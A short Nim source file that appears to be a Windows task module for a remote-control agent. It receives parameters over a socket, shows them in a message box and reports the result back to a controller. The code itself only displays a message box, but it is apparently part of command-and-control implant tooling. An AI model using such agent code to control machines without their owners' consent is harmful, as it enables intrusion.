import ../client/communication
from std/net import Socket
from std/json import `%*`
when defined(windows):
  import winim/lean

when defined(windows):
  proc executeTask*(socket: net.Socket, taskId: int, params: seq[string]) =
    let taskOutput = TaskOutput(
      task: "output",
      taskId: taskId,
      error: "",
      data: %*{}
    )

    MessageBox(0, params[0], params[1], 0)
    socket.sendOutput(taskOutput)